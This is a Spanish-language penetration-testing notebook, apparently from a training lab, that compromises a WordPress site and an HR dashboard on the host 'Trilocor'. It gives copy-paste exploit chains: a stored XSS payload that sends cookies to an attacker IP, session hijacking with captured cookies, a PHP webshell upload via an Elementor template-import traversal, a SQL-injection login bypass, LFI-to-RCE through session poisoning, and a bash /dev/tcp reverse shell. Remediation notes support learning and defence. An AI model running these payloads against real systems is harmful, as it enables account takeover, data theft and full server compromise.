[[CWES]] [[Web Enumeración]] [[Web Explotación]] [[CWES - Checklist]]

# Trilocor
## ip y hosts

IP: 
```
10.129.248.61
```

Agregue al /etc/hosts: 
```
10.129.248.61    trilocor.local www.trilocor.local
```

Hice un escaneo de hosts:
```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.trilocor.local" -u http://10.129.247.239/ -fw 5194 -t 100
```
y encontré: `admin` el cual agregué también al /etc/hosts: 
```
10.129.248.61    trilocor.local www.trilocor.local admin.trilocor.local
```

## servidor

El servidor es: 
```
curl -Iv http://www.trilocor.local/

Apache/2.4.41 (Ubuntu)
```

## CMS 

Me encuentro con un wordpress 6.0.2 y astra 3.9.2

### robots.txt

También encuentro esto en `robots.txt`: 
```
http://admin.trilocor.local/robots.txt

User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php

Sitemap: http://www.trilocor.local/wp-sitemap.xml

# y para el caso del admin:
Sitemap: http://admin.trilocor.local/wp-sitemap.xml
```

### plugins y temas

Extraigo los plugins y temas: 
```
curl -s http://www.trilocor.local/ | grep plugin

curl -s http://www.trilocor.local/ | grep themes
```
encuentro:
- **Plugin:** Elementor Website Builder
- **Versión detectada:** **3.7.7**
    - _Nota:_ Esta versión se confirma tanto en los parámetros de los scripts (`?ver=3.7.7`) como en el objeto de configuración de Javascript (`"version":"3.7.7"`).
Dentro de las carpetas de Elementor, también se cargan los siguientes componentes y librerías externas con sus respectivas versiones (controladas por el propio plugin o por WordPress):
- **Elementor Icons (eicons):** Versión **5.16.0** (`?ver=5.16.0`)
- **Font Awesome (Iconos):** Versión **5.15.3** (`?ver=5.15.3`)
- **Waypoints (Librería de scroll):** Versión **4.0.2** (`?ver=4.0.2`)

### wpscan
wpscan encontró: 
```
sudo wpscan --url http://www.trilocor.local/ --enumerate --api-token [REDACTED]
y
sudo wpscan --url http://admin.trilocor.local/ --enumerate --api-token [REDACTED]
```

[[resultado wpscan]]

### usuarios

Encuentro esta lista de usuarios: 
```
web-admin
web-editor
hr-smith
r.batty
pr-martins
trilocor.Emerald
trilocor.Shiv
trilocor.Gradin
trilocor.Vagient
trilocor.Fankle
```

### fuerza bruta

Les hago fuerza bruta con wp-scan: 
```
wpscan --password-attack xmlrpc -t 20 -U users-wp.txt -P /usr/share/wordlists/rockyou.txt --url http://admin.trilocor.local/ --api-token [REDACTED]
```

### api 

http://www.trilocor.local/index.php/wp-json/
y
http://www.trilocor.local/index.php/wp-json/wp/v2/

## Stored XSS

**Paso 1 — Leer el contenido real del sitio.**
En la home hay una sección "Leave your testimonial". Su código fuente revela el endpoint. Se obtiene de dos formas equivalentes:
- _Desde el navegador:_ entre a `http://www.trilocor.local/`, fui a la sección de testimonios, click derecho → "Ver código fuente" y buscque el formulario.
- _Desde la API REST_ (que devuelve el contenido de la home en crudo):
```bash
curl -s 'http://www.trilocor.local/index.php/wp-json/wp/v2/posts' | grep -i 'action='
```
En ambos casos aparece este formulario:
```html
<form id="contact" action="/wp-content/plugins/secure_testimonials/post-testimonial.php" method="post">
```
Ese atributo action="..." es de donde sale la ruta. Ahí aparece el nombre del plugin (secure_testimonials) y su endpoint (post-testimonial.php). El method="post" confirma que hay que enviarlo por POST.

**Paso 2 — Confirmar que el endpoint procesa el envío.** Replicando el POST con curl (lo que el navegador hace al apretar "Submit"):
```
curl -i -X POST 'http://www.trilocor.local/wp-content/plugins/secure_testimonials/post-testimonial.php' \
  --data 'name=test&company_title=test&email=test@test.com&testimonial=hola'
```
Respuesta: `HTTP 200` con "Thank you! Your testimonial has been received successfully." → el endpoint guarda lo que se manda.

**Paso 3 — Detecto que no sanitiza el input.** Se reenvía con etiquetas HTML de prueba y las acepta sin filtrarlas:
```
curl -X POST 'http://www.trilocor.local/wp-content/plugins/secure_testimonials/post-testimonial.php' \
  --data 'name=test&company_title=test&email=a@a.com&testimonial=<u>x</u>'
```
Como no rechaza el HTML, también va a aceptar `<script>` → posible Stored XSS.

**Paso 4 — Monto el receptor.** En la máquina de ataque:
```
python3 -m http.server 80
```

**Paso 5 — Inyecto el payload.** Se envía un testimonial cuyo contenido es un script que roba la cookie:
```
curl -X POST 'http://www.trilocor.local/wp-content/plugins/secure_testimonials/post-testimonial.php' \
  --data-urlencode 'name=Cliente' \
  --data-urlencode 'company_title=ACME' \
  --data-urlencode 'email=a@a.com' \
  --data-urlencode 'testimonial=<script>new Image().src="http://10.10.14.22/hook?c="+document.cookie</script>'
```

**Paso 6 — Capturo la cookie.** Cuando el revisor (`web-editor`) abre el testimonial, su navegador ejecuta el script y el listener recibe:
```
GET /hook?c=wordpress_828ff7d64a441f8aab6a0310bdcee6a9=web-editor%7C1782146326%7Co8ojVl6YFXdQDhkTqC34RCUTxZnZN5xzlLwUUBnNnCr%7Ca5dca2a886099d561ecddfd166c764e342f1eb1d15a87a0ec52fb09f6a562b57;%20wordpress_logged_in_828ff7d64a441f8aab6a0310bdcee6a9=web-editor%7C1782146326%7Co8ojVl6YFXdQDhkTqC34RCUTxZnZN5xzlLwUUBnNnCr%7Cce6e051f7354cccc2d71004f07a84944e8f65b0219df49d6868dbd04462463e4;%20wordpress_test_cookie=WP%20Cookie%20check HTTP/1.1" 404 -
```
Las cookies no tenían `HttpOnly`, por eso `document.cookie` pudo leerlas.

**Paso 7 — Secuestrar la sesión.** Cargo esas cookies (decodificando `%7C` → `|`) en el navegador con Cookie-Editor sobre `admin.trilocor.local`, y al entrar a `/wp-admin/` WordPress reconoce la sesión como `web-editor` sin pedir contraseña.
Abrí Cookie-Editor y creé dos cookies nuevas, una por cada una:
- Nombre: `wordpress_logged_in_828ff7d64a441f8aab6a0310bdcee6a9` → Valor: `web-editor|1782144468|7XpTu09NZe1UJuzI94TtiASxkRuxxlMuFXaOhvD81Ul|0fdf700a49698a0b069a57498190bc8e2e24330b62d2ffa335171acc79196817`
- Nombre: `wordpress_828ff7d64a441f8aab6a0310bdcee6a9` → Valor: `web-editor|1782144468|7XpTu09NZe1UJuzI94TtiASxkRuxxlMuFXaOhvD81Ul|3d54c85847ebb860dfb379cf8b55d0df6e650a57b24ebc1adcbc23912fd627e2`

## Hallazgo: Remote Code Execution vía importación de plantillas de Elementor (CVE-2023-48777)

### Resumen

|Campo|Detalle|
|---|---|
|**Componente afectado**|Plugin Elementor Website Builder **3.7.7**|
|**Vulnerabilidad**|Subida de archivo arbitrario + Path Traversal → RCE|
|**CVE**|CVE-2023-48777|
|**CWE**|CWE-434 (Unrestricted Upload of File with Dangerous Type)|
|**Severidad**|Crítica (CVSS 3.1: 9.9)|
|**Privilegio requerido**|Autenticado, rol **Contributor o superior**|
|**Host**|`admin.trilocor.local`|
|**Versión corregida**|Elementor ≥ 3.18.2|

La función de importación de plantillas de Elementor procesa un parámetro `fileData` (contenido en Base64) y lo escribe en disco usando el nombre indicado en `fileName`. Dado que `fileName` no valida secuencias de path traversal, un atacante autenticado con permisos de edición de posts puede escribir un archivo PHP arbitrario en una ruta web-accesible y ejecutarlo, obteniendo RCE como el usuario del servidor web (`www-data`).

---

### Prerrequisito

Se requiere una sesión autenticada con rol **Editor** (cumple el umbral Contributor+). En esta evaluación dicha sesión se obtuvo previamente mediante un **Stored XSS en el plugin a medida `secure_testimonials`**, que permitió robar la cookie de sesión del usuario `web-editor` (ver hallazgo correspondiente). Las cookies utilizadas a continuación son las de esa sesión.

---

### Pasos de reproducción
10.10.14.22
#### 1. Definir la sesión autenticada

```bash
COOKIE='wordpress_logged_in_828ff7d64a441f8aab6a0310bdcee6a9=web-editor%7C1782155957%7CqP0CX69YENag9XhP37yAHV5ElveYZaVclxPglba8Gwe%7Ca33f9ccaf3183d5e54e722f4c67077c726443cfd947574b7a72230fcd0bb705c; wordpress_828ff7d64a441f8aab6a0310bdcee6a9=web-editor%7C1782155957%7CqP0CX69YENag9XhP37yAHV5ElveYZaVclxPglba8Gwe%7C84a1f23a5cfb0099c09d7d152f58f1d9920cefa251994718010c3104ef8e2088'
```

#### 2. Obtener el nonce de Elementor

Elementor publica el nonce para sus llamadas AJAX en la configuración embebida de cualquier página del editor. Se extrae con la sesión autenticada:
```bash
NONCE=$(curl -s -b "$COOKIE" 'http://admin.trilocor.local/wp-admin/post.php?post=22&action=elementor' \
  | grep -oP '"ajax":\{"url":"[^"]+","nonce":"\K[a-z0-9]+')
echo "Nonce: $NONCE"
```

Salida esperada:
```
Nonce: d0cab1a2f0
```

#### 3. Preparar el webshell en Base64

```bash
PAYLOAD=$(echo -n '<?php system($_GET[0]); ?>' | base64)
```

#### 4. Subir el webshell mediante el importador vulnerable

La petición se envía como POST `application/x-www-form-urlencoded` (no es un upload multipart). El archivo se escribe en el directorio temporal de Elementor; con `fileName=/../shell.php` el traversal lo deja en `wp-content/uploads/elementor/tmp/shell.php`.
```bash
curl -s -i -b "$COOKIE" 'http://admin.trilocor.local/wp-admin/admin-ajax.php' \
  --data-urlencode 'action=elementor_library_direct_actions' \
  --data-urlencode "_nonce=$NONCE" \
  --data-urlencode 'library_action=import_template' \
  --data-urlencode 'fileName=/../shell.php' \
  --data-urlencode "fileData=$PAYLOAD"
```

**Resultado esperado:** `HTTP/1.1 500 Internal Server Error`.

> Nota: el 500 es la señal de éxito. El servidor escribe el archivo correctamente y luego falla al intentar procesar el contenido como una plantilla válida; ese error posterior produce el 500, pero el `.php` ya quedó en disco.

#### 5. Confirmar la ejecución remota de código

```bash
curl 'http://admin.trilocor.local/wp-content/uploads/elementor/tmp/shell.php?0=id'
```

**Prueba (salida obtenida):**
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

El webshell queda accesible **sin necesidad de autenticación**, y permite ejecutar comandos arbitrarios pasándolos por el parámetro `0`, por ejemplo:
```bash
curl 'http://admin.trilocor.local/wp-content/uploads/elementor/tmp/shell.php?0=ls+/'
curl 'http://admin.trilocor.local/wp-content/uploads/elementor/tmp/shell.php?0=cat+/b553866867105672af6c914b09070105.txt'
```

---

### Notas de ajuste del path traversal

El directorio temporal real es un subdirectorio aleatorio dentro de `wp-content/uploads/elementor/tmp/`. La cantidad de `../` en `fileName` determina dónde aterriza el archivo:

|`fileName`|Ruta resultante|
|---|---|
|`/../shell.php`|`wp-content/uploads/elementor/tmp/shell.php`|
|`/../../shell.php`|`wp-content/uploads/elementor/shell.php`|
|`shell.php` (sin traversal)|dentro del subdirectorio aleatorio de `tmp/`|

Si una ruta devuelve 404, reintentar la subida (paso 4) y solicitar el archivo inmediatamente, ya que los archivos temporales pueden ser eliminados automáticamente.

---

### Impacto

Compromiso total del servidor web. Un usuario con privilegios mínimos de edición (Editor/Contributor) obtiene ejecución de comandos como `www-data`, lo que habilita: lectura de `wp-config.php` y credenciales de base de datos, lectura de la flag, establecimiento de una reverse shell y enumeración para escalada de privilegios local.

---

### Remediación

- **Actualizar Elementor a la versión 3.18.2 o superior**, donde la subida arbitraria y el path traversal están corregidos.
- Aplicar el principio de mínimo privilegio: revisar qué roles tienen acceso a Elementor.
- Configurar el servidor para **impedir la ejecución de PHP dentro de `wp-content/uploads/`** (regla en Apache/Nginx que deniegue `*.php` en esa ruta).
- Reforzar el control de versiones de plugins y un proceso de parcheo periódico.

---

### Referencias

- CVE-2023-48777 — Wordfence: _Elementor ≤ 3.18.1 — Authenticated (Contributor+) Arbitrary File Upload to RCE via Template Import_
- WPScan Vulnerability Database: `a6b3b14c-f06b-4506-9b88-854f155ebca9`
- Patchstack — _Critical Vulnerability in Elementor Affecting 5+ Million Websites_
- Investigador original: Hồng Quân (2023-12-06)

# Recursos Humanos

## Finding — Authentication Bypass vía SQL Injection (HR Dashboard)

**Target:** Trilocor — HR Dashboard **Host:** `www.trilocor.local` (`10.129.247.239`) — puerto `8088/tcp` (Apache/2.4.41 Ubuntu, PHP) **Endpoint:** `/index.php` **Parámetro vulnerable:** `username` **Tipo:** SQL Injection → Authentication Bypass **Severidad:** Crítica **Método de explotación efectivo:** **GET** (no POST)

---

### 1. Resumen

El login del HR Dashboard valida las credenciales construyendo una consulta SQL con concatenación directa de la entrada del usuario. La aplicación aplica un filtro de sanitización (bloquea la comilla simple y otros caracteres) **únicamente sobre la rama POST** del formulario, pero la lógica de autenticación consume el parámetro `username` también por **GET**, donde ese filtro no se aplica.

Enviando la inyección por la query string (GET) se evade por completo la sanitización y se fuerza que la consulta devuelva una fila válida, autenticando la sesión sin credenciales legítimas y exponiendo el contenido del dashboard.

**Payload final:**

```
/index.php?username='OR+'a'='a'--+-&password='
```

---

### 2. Reconocimiento previo

El formulario HTML declara `method="post"` y dos campos (`username`, `password`):

```bash
curl -s "http://www.trilocor.local:8088/index.php" | grep -A3 '<form'
```

```html
<form class="form" action="/index.php" method="post">
    <input type="username" name="username" id="username" ...>
    <input type="password" name="password" id="password" ...>
```

La aplicación responde con dos mensajes distintos en `<span class="invalid-feedback">`, que sirven como **oráculo** durante la explotación:

|Mensaje|Significado|
|---|---|
|`Invalid username.`|El input fue rechazado por el filtro de sanitización (no llegó al SQL)|
|`Invalid login details.`|El input pasó el filtro y llegó a la query, pero no hubo match|
|_(ninguno / redirección)_|Autenticación exitosa|

---

### 3. Identificación del filtro (rama POST)

Sondeando carácter por carácter sobre el campo `username` por POST se determina qué caracteres bloquea la sanitización:

```bash
T="http://www.trilocor.local:8088"

probe() {
  curl -s -X POST "$T/index.php" \
    --data-urlencode "username=$1" --data-urlencode "password=x" \
    | grep -oE 'Invalid (username|login details)\.' | head -1
}

probe "admin"      # -> Invalid login details.  (pasa)
probe "admin'"     # -> Invalid username.        (BLOQUEADO: comilla simple)
probe "admin\""    # -> Invalid username.        (BLOQUEADO: comilla doble)
probe "admin#"     # -> Invalid username.        (BLOQUEADO)
```

**Caracteres bloqueados (POST):** `' " # espacio = \ ( ) /` **Caracteres permitidos (POST):** `-` `` ` `` `| * ;` y alfanuméricos

Conclusión parcial: por POST, sin comilla simple no es posible salir de la cadena `WHERE username='...'`, por lo que la inyección parece mitigada.

---

### 4. Causa raíz — validación inconsistente entre métodos HTTP

La mitigación es **incompleta**: el filtro se aplica al flujo POST, pero la construcción de la consulta SQL toma el parámetro `username` también de la query string (GET) — comportamiento típico de `$_REQUEST` o de una lectura `$_GET` separada de la validación. Por GET, la comilla simple **no** es filtrada y llega cruda al motor SQL.

Esto explica por qué las inyecciones por POST devolvían siempre `Invalid username.` o `Invalid login details.` sin éxito, mientras que la misma inyección por GET sí autentica.

---

### 5. Explotación (paso a paso, replicable)

#### Paso 5.1 — Confirmar que GET evade el filtro

Por GET, la comilla simple ya no es rechazada (no aparece `Invalid username.`):

```bash
curl -s "http://www.trilocor.local:8088/index.php?username=admin%27&password=x" \
  | grep -oE 'Invalid (username|login details)\.'
# Esperado: Invalid login details.   (el quote pasó y llegó al SQL)
```

#### Paso 5.2 — Inyectar el bypass de autenticación

Payload lógico (antes de URL-encode):

```
username = ' OR 'a'='a' -- -
password = '
```

Esto cierra la cadena del `username`, agrega una condición siempre verdadera (`'a'='a'`) y comenta el resto de la consulta con `-- -`.

Request final (URL-encoded; `+` = espacio, `%27` = comilla simple):

```bash
curl -s -i \
  "http://www.trilocor.local:8088/index.php?username=%27OR+%27a%27=%27a%27--+-&password=%27"
```

Equivalente, tal como se cargó en la barra de direcciones del navegador (el navegador encodea automáticamente):

```
http://www.trilocor.local:8088/index.php?username='OR+'a'='a'--+-&password='
```

#### Paso 5.3 — Consulta resultante (reconstruida)

```sql
SELECT * FROM users WHERE username='' OR 'a'='a' -- -' AND password='...'
```

La condición `'a'='a'` es siempre verdadera y `-- -` anula el resto, por lo que la consulta devuelve una fila y la autenticación se concede.

#### Paso 5.4 — Acceso al dashboard y flag

La autenticación exitosa redirige / habilita `dashboard.php`, que sin sesión válida solo devolvía el login. Con la sesión obtenida se accede al contenido real del dashboard, donde se encuentra la flag.

```bash
# Capturar la cookie de sesión generada por el login inyectado
curl -s -i -c /tmp/trilocor.txt \
  "http://www.trilocor.local:8088/index.php?username=%27OR+%27a%27=%27a%27--+-&password=%27" \
  -o /dev/null

# Reutilizar la sesión para leer el dashboard
curl -s -b /tmp/trilocor.txt "http://www.trilocor.local:8088/dashboard.php"
```

---

### 6. Nota metodológica — Burp vs. barra de direcciones

Durante la explotación, la inyección **no pasaba** al enviarla desde Burp pero **sí** desde la barra de direcciones del navegador. Causa: el navegador URL-encodea automáticamente los caracteres especiales del payload (comilla, espacios, `=`), generando una query string bien formada. En Burp, los caracteres iban crudos o con un encoding que el servidor no parseaba de igual forma, dejando la query string malformada.

**Recomendación operativa:** al reproducir inyecciones GET en Burp, aplicar _Convert selection → URL-encode key characters_ sobre `'`, espacios y `=` antes de enviar el request.

---

### 7. Impacto

- Bypass completo de la autenticación sin credenciales válidas.
- Acceso no autorizado al HR Dashboard y a la información que expone.
- Potencial extensión a extracción de datos vía SQLi (UNION / blind) más allá del bypass, al confirmarse inyección en el parámetro `username`.

---

### 8. Remediación

1. **Consultas parametrizadas / prepared statements** (PDO o `mysqli` con binding). Es la corrección de fondo; elimina la inyección independientemente del input.
2. **Validación y sanitización uniformes entre métodos HTTP.** No depender de filtros por rama (POST vs. GET); validar en un único punto del lado servidor.
3. **No leer credenciales por `$_REQUEST`/GET.** Forzar que el login se procese solo por POST y rechazar el método GET para ese endpoint.
4. **Mensajes de error genéricos.** Unificar `Invalid username.` / `Invalid login details.` en un único mensaje para eliminar el oráculo.
5. Defensa en profundidad: cuenta de BD con privilegios mínimos y WAF.

---

### 9. Apéndice — Comandos de reproducción (copy/paste)

```bash
T="http://www.trilocor.local:8088"

# 1) Confirmar que GET evade el filtro
curl -s "$T/index.php?username=admin%27&password=x" \
  | grep -oE 'Invalid (username|login details)\.'

# 2) Auth bypass por GET
curl -s -i "$T/index.php?username=%27OR+%27a%27=%27a%27--+-&password=%27"

# 3) Sesión + dashboard
curl -s -c /tmp/trilocor.txt \
  "$T/index.php?username=%27OR+%27a%27=%27a%27--+-&password=%27" -o /dev/null
curl -s -b /tmp/trilocor.txt "$T/dashboard.php"
```

## Finding — LFI → RCE vía Session Poisoning (HR Dashboard)

**Target:** Trilocor — HR Dashboard **Host:** `trilocor.local` (`10.129.247.239`) — puerto `8088/tcp` (Apache/2.4.41 Ubuntu, PHP) **Endpoint:** `/dashboard.php` (requiere sesión autenticada) **Parámetro vulnerable:** `language` **Tipo:** Local File Inclusion (LFI) encadenado a Remote Code Execution (RCE) mediante envenenamiento del archivo de sesión PHP **Severidad:** Crítica **Precondición:** Sesión autenticada (ver finding previo: SQLi Auth Bypass) **Método de explotación efectivo:** **POST** (no GET)

---

### 1. Resumen

El parámetro `language` de `dashboard.php` se pasa a una función de inclusión (`include()`) sin validación adecuada. La aplicación implementa un filtro de path traversal, pero solo sobre la rama **GET**; al enviar el parámetro por **POST**, el filtro no se aplica y permite incluir archivos locales arbitrarios.

Adicionalmente, el valor de `language` se **persiste sin sanitizar** en `$_SESSION['lang']`, que PHP serializa a un archivo en disco (`/var/lib/php/sessions/sess_<ID>`). Combinando ambos defectos se logra ejecución de comandos: se escribe código PHP dentro del propio archivo de sesión (vía el parámetro persistido) y luego se incluye ese archivo mediante el LFI, forzando a PHP a interpretarlo.

---

### 2. Patrón raíz del target — validación inconsistente GET vs POST

Este target presenta el mismo defecto de diseño en dos puntos distintos:

|Vector|Rama con filtro|Rama explotable|
|---|---|---|
|Login (SQLi)|POST|GET|
|LFI (`language`)|GET|POST|

La sanitización se aplica de forma dependiente del método HTTP, dejando siempre una ruta sin validar. Vale documentarlo como hallazgo de arquitectura: **la validación no debe depender del método de transporte**.

---

### 3. Identificación del LFI

### 3.1 — El filtro de traversal bloquea GET

```bash
T="http://trilocor.local:8088"
C="$HOME/trilocor_cookie.txt"

# (re)generar sesión válida con el SQLi del login
curl -s -c "$C" "$T/index.php?username=%27OR+%27a%27=%27a%27--+-&password=%27" -o /dev/null

# GET con traversal -> bloqueado
curl -s -b "$C" "$T/dashboard.php?language=../../../../etc/passwd" \
  | grep -aoE 'Malicious request blocked'
# -> Malicious request blocked!
```

#### 3.2 — POST evade el filtro; bypass `....//`

El filtro residual sobre la rama POST elimina `../` en **una sola pasada** (no recursivo). La secuencia `....//` sobrevive: al quitarse el `../` interno queda `../` efectivo. Solo `....//` (cuatro puntos, dos barras) funciona.

```bash
curl -s -b "$C" -X POST "$T/dashboard.php" \
  --data-urlencode 'language=....//....//....//....//etc/passwd' \
  | grep -a 'root:.*:0:0:'
# -> root:x:0:0:root:/root:/bin/bash   (LFI confirmado)
```

---

### 4. Confirmación del vector de RCE

#### 4.1 — Descartar wrappers remotos

`data://` no produjo ejecución, indicando `allow_url_include=Off`. Esto descarta `data://` y los filter-chains que terminan en `php://temp`. El vector válido pasa a ser la inclusión de un archivo **local** controlado por el atacante.

#### 4.2 — Confirmar que `language` se persiste en la sesión

Se incluye el propio archivo de sesión para inspeccionar su contenido serializado:

```bash
SID=$(grep -oE 'PHPSESSID[[:space:]]+[a-z0-9]+' "$C" | awk '{print $2}')

curl -s -b "$C" -X POST "$T/dashboard.php" \
  --data-urlencode "language=....//....//....//....//var/lib/php/sessions/sess_$SID" \
  | grep -aoE '[a-z]+\|[^<]+'
```

Salida observada (el valor de `language` queda almacenado crudo en `lang`):

```
logged|b:1;username|s:15:"'OR 'a'='a'-- -";lang|s:53:"php://filter/convert.base64-encode/resource=dashboard";
```

Esto confirma la precondición del ataque: el último valor enviado en `language` se escribe sin escapar en `$_SESSION['lang']` → en el archivo `sess_<ID>` en disco.

---

### 5. Explotación — RCE paso a paso

> El archivo de sesión se reescribe en **cada** request que envíe `language`. Por eso el webshell debe (1) escribirse y (2) incluirse en requests consecutivos, sin ningún request intermedio que pise el valor.

#### Paso 5.1 — Escribir el webshell en la sesión

```bash
curl -s -b "$C" -X POST "$T/dashboard.php" \
  --data-urlencode 'language=<?php system($_POST["cmd"]); ?>' -o /dev/null
```

El string `<?php system($_POST["cmd"]); ?>` queda almacenado, inerte, dentro de `sess_$SID`.

#### Paso 5.2 — Incluir la sesión y ejecutar

```bash
curl -s -b "$C" -X POST "$T/dashboard.php" \
  --data-urlencode "language=....//....//....//....//var/lib/php/sessions/sess_$SID" \
  --data-urlencode 'cmd=id' | grep -a 'uid='
# -> uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

El `include()` carga el archivo de sesión; PHP interpreta el bloque `<?php ?>` y ejecuta `system($_POST['cmd'])`. RCE como `www-data` confirmado.

#### Paso 5.3 — Ejecución arbitraria

Mientras el webshell no se sobrescriba, se cambia solo el parámetro `cmd`:

```bash
curl -s -b "$C" -X POST "$T/dashboard.php" \
  --data-urlencode "language=....//....//....//....//var/lib/php/sessions/sess_$SID" \
  --data-urlencode 'cmd=ls /'
```

> Nota operativa: usar **rutas absolutas** en `cmd` (p. ej. `cat /archivo.txt`). El cwd del proceso PHP no es `/`, por lo que las rutas relativas pueden fallar.

---

### 6. Variante — payload PHP URL-encodeado

Si se prefiere enviar el código ya encodeado en lugar de dejar que curl lo encodee, usar `--data` (NO `--data-urlencode`, que lo encodearía dos veces):

```bash
# %3c%3f%70%68%70... = <?php system('id'); ?>
curl -s -b "$C" -X POST "$T/dashboard.php" \
  --data "language=%3c%3f%70%68%70%20%73%79%73%74%65%6d%28%27%69%64%27%29%3b%20%3f%3e" -o /dev/null

curl -s -b "$C" -X POST "$T/dashboard.php" \
  --data-urlencode "language=....//....//....//....//var/lib/php/sessions/sess_$SID" \
  | grep -a 'uid='
```

Diferencia: aquí el comando (`id`) está **hardcodeado** en el PHP, no se pasa por `cmd`. Menos flexible; útil solo como prueba de concepto.

---

### 7. Shell interactiva (opcional)

Para una sesión estable que no dependa del archivo de sesión reescribible:

```bash
# Listener local
nc -lvnp 4444

# Reinyectar webshell y disparar (TU_IP = IP de la VPN/tun0)
curl -s -b "$C" -X POST "$T/dashboard.php" \
  --data-urlencode 'language=<?php system($_POST["cmd"]); ?>' -o /dev/null
curl -s -b "$C" -X POST "$T/dashboard.php" \
  --data-urlencode "language=....//....//....//....//var/lib/php/sessions/sess_$SID" \
  --data-urlencode 'cmd=bash -c "bash -i >& /dev/tcp/TU_IP/4444 0>&1"'
```

Estabilizar: `python3 -c 'import pty;pty.spawn("/bin/bash")'` → `Ctrl-Z` → `stty raw -echo; fg`.

---

### 8. Impacto

- Ejecución de comandos arbitrarios como `www-data` en el servidor.
- Lectura de cualquier archivo legible por el servicio web (LFI base).
- Punto de pivote para enumeración local y escalada de privilegios.

---

### 9. Remediación

1. **No usar entrada del usuario en `include()`/`require()`.** Mapear `language` a una whitelist cerrada de archivos permitidos:
    
    ```php
    $allowed = ['en','es','de','it'];$lang = in_array($_POST['language'] ?? '', $allowed, true) ? $_POST['language'] : 'en';include "lang/{$lang}.php";
    ```
    
2. **Validación uniforme entre métodos HTTP.** No aplicar el filtro de traversal solo a GET; centralizar la validación del lado servidor.
3. **No persistir entrada cruda en `$_SESSION`.** Escapar/validar antes de almacenar.
4. **Configuración de PHP:** mantener `allow_url_include=Off` (ya estaba) y, si es posible, restringir `open_basedir` para que la inclusión no alcance `/var/lib/php/sessions/`.
5. Defensa en profundidad: ejecutar el servicio con privilegios mínimos.

---

### 10. Apéndice — Reproducción (copy/paste)

```bash
T="http://trilocor.local:8088"
C="$HOME/trilocor_cookie.txt"

# 1) Sesión vía SQLi del login
curl -s -c "$C" "$T/index.php?username=%27OR+%27a%27=%27a%27--+-&password=%27" -o /dev/null
SID=$(grep -oE 'PHPSESSID[[:space:]]+[a-z0-9]+' "$C" | awk '{print $2}')

# 2) Confirmar LFI (POST + bypass ....//)
curl -s -b "$C" -X POST "$T/dashboard.php" \
  --data-urlencode 'language=....//....//....//....//etc/passwd' | grep -a 'root:.*:0:0:'

# 3) Escribir webshell en la sesión
curl -s -b "$C" -X POST "$T/dashboard.php" \
  --data-urlencode 'language=<?php system($_POST["cmd"]); ?>' -o /dev/null

# 4) Incluir sesión y ejecutar
curl -s -b "$C" -X POST "$T/dashboard.php" \
  --data-urlencode "language=....//....//....//....//var/lib/php/sessions/sess_$SID" \
  --data-urlencode 'cmd=id' | grep -a 'uid='
```